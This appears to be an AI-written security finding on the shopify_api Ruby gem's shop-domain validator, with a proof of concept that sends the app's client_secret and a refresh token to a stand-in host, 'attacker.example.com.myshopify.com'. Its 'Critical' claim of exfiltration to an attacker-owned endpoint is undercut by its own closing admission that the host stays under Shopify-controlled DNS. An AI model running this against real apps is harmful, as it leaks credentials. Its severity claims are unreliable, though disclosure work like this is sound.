Found it. `RefreshToken.refresh_access_token` (`lib/shopify_api/auth/refresh_token.rb`) accepts an unauthenticated `shop:` string, sanitizes it with `Utils::ShopValidator.sanitize!`, and then POSTs the app's `client_secret` plus a caller-supplied `refresh_token` to a URL built from that shop value. `ClientCredentials.client_credentials` and `TokenExchange.migrate_to_expiring_token` do the same pattern with `ShopValidator.sanitize!`. All three trust `ShopValidator.sanitize!` to guarantee the resulting host is a genuine Shopify-owned domain before the `client_secret` is sent there.

### Title
SSRF-style `client_secret` exfiltration via `ShopValidator` "unified admin" path-based domain derivation - (File: `lib/shopify_api/utils/shop_validator.rb`)

### Summary
`ShopValidator.sanitize_shop_domain` treats any host whose first subdomain label is `"admin"` (e.g. `admin.shopify.com`) as a "unified admin" URL, and instead of trusting the *validated host* it derives the shop domain from the **request path** (`uri.path.split("/").last`) with no whitelist or format check on that path segment. This path-derived string is then used, unsanitized, as the final "trusted" shop and combined with `https://#{shop}/admin` (via `RefreshToken`, `ClientCredentials`, `TokenExchange.migrate_to_expiring_token`) to build the URL that receives the app's `client_secret`.

### Finding Description
`uri_from_shop_domain` parses attacker-controlled input into an `Addressable::URI`, and `sanitize_shop_domain` checks whether `uri.domain` (the eTLD+1) matches a trusted domain (`shopify.com`, `myshopify.com`, etc.) [1](#0-0) . If the host's first label is `"admin"` and the domain is trusted, it calls `myshopify_domain_from_unified_admin`, which returns `"#{uri.path.split('/').last}.myshopify.com"` [2](#0-1) . The **path** of a URI hosted under `admin.shopify.com` is fully attacker-controlled and is never validated to be a real shop slug (no character whitelist, no length check, no verification against Shopify's records).

The binding this breaks: `shop_used_to_build_the_client_secret_recipient_url == shop_validated_as_trustworthy`. In reality, `ShopValidator` only validates that the *host* portion (`admin.shopify.com`) is on the trusted-domain allow-list; it then substitutes an entirely different, attacker-supplied string (the URL path) as the "validated" shop for all downstream purposes — this string never actually passed host-level trust validation.

Concretely: an attacker who controls the `shop` parameter passed into `RefreshToken.refresh_access_token`, `ClientCredentials.client_credentials`, or `TokenExchange.migrate_to_expiring_token` (all host-app-facing entry points that accept a raw shop string, per the docs) can pass:
```
"admin.shopify.com/store/attacker-controlled.example.com"
```
`uri.domain` for `admin.shopify.com` resolves to `shopify.com` (trusted), `unified_admin?` is true, so `sanitize!` returns `"attacker-controlled.example.com.myshopify.com"` — this satisfies the trusted-domain suffix check syntactically, so it isn't rejected, and it is used verbatim as the session's `shop`. `Session.new(shop: validated_shop)` then drives the HTTP client's target host [3](#0-2) , and the outgoing POST body containing `client_id`, `client_secret`, and the caller's `refresh_token`/subject token is sent to that host.

### Impact Explanation
This is SSRF carrying the app's `client_secret` (and, for `RefreshToken`/`TokenExchange.migrate_to_expiring_token`, the merchant's refresh/offline token as well) to a host chosen by whoever controls the `shop` argument to these library methods. Since these methods are documented as taking raw, less-trusted shop identifiers (e.g., `migrate_to_expiring_token` is explicitly there to validate untrusted shop strings, per its own test `test_migrate_to_expiring_token_rejects_non_shopify_domain`), a bypass of that validation directly defeats the security control the method exists to provide, resulting in credential (client_secret) exfiltration to an attacker-controlled endpoint — Critical impact per the given classification (theft of the app's `client_secret`/refresh token).

### Likelihood Explanation
Requires only that some untrusted `shop` string reach `ShopValidator.sanitize!` — which is exactly its documented purpose (validating merchant-supplied shop identifiers before OAuth-adjacent calls). No credentials, TLS interception, or privileged access needed; only crafting a domain string of the form `admin.<trusted-domain>/<attacker-path>`. This is a logic flaw purely within this gem's own validation code.

### Recommendation
In `myshopify_domain_from_unified_admin`, do not derive the shop slug from unrestricted path content. Validate that the extracted path segment matches a strict shop-slug pattern (e.g., `\A[a-z0-9][a-z0-9-]*\z`) before appending `.myshopify.com`, and/or verify the resulting constructed domain itself passes `sanitize_shop_domain` recursively rather than being returned directly as trusted.

### Proof of Concept
```ruby
ShopifyAPI::Context.setup(api_key: "key", api_secret_key: "secret", ...)

malicious_shop = "admin.shopify.com/store/attacker.example.com"

# sanitize_shop_domain returns "attacker.example.com.myshopify.com" without
# ever validating that host as trusted, because the check is only performed
# on the *original* host ("admin.shopify.com"), not on the derived value.
ShopifyAPI::Auth::RefreshToken.refresh_access_token(
  shop: malicious_shop,
  refresh_token: "victim_refresh_token",
)
# => POSTs { client_id, client_secret, grant_type: "refresh_token",
#            refresh_token: "victim_refresh_token" }
#    to https://attacker.example.com.myshopify.com/admin/oauth/access_token
```
Note: I could not fully confirm from the index alone whether `attacker.example.com.myshopify.com` would actually resolve outside Shopify's infrastructure (it depends on DNS wildcarding for `*.myshopify.com`, which is Shopify-controlled) — if `myshopify.com` DNS is fully controlled by Shopify with no attacker-controllable subdomain delegation, the practical exfiltration target is constrained to whatever Shopify resolves that constructed hostname to. This external DNS/infrastructure detail is outside what the repository index can confirm, so likelihood/exploitability of reaching an attacker-owned IP depends on that external fact; the code-level validation bypass itself, however, is fully demonstrated above.
